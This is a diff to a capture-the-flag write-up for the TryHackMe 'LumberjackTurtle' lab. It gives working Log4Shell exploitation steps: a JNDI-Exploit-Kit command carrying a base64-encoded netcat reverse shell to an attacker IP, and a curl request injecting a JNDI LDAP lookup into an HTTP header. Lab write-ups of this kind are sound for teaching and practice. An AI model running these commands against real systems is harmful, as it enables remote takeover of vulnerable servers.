@@ -58,9 +58,15 @@ Next, `git clone` the [JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-K
 java -jar target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L "10.9.4.84:1389" -C "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC45LjQuODQgOTk5OSA+L3RtcC9m | base64 -d | bash"
 
 ```
-The base64 payload is a simple reverse shell that connects to our attacker machine at port 9999. Grab the exploit URL from the output and send the request. Make sure to keep a listener running.
+The base64 payload is a simple reverse shell that connects back to our attacker machine at port 9999. 
 
 ![](https://raw.githubusercontent.com/xplo1t-sec/CTF/master/TryHackMe/LumberjackTurtle/images/exploit.png)
+
+Grab the exploit URL from the output shown above and send the request. 
+```bash
+curl 'http://10.10.193.69/~logs/log4j' -H 'X-Api-Version: ${jndi:ldap://10.9.4.84:1389/aefzek}'
+```
+Make sure to keep a listener running on port 9999.
 
 ### Privilege escalation
 
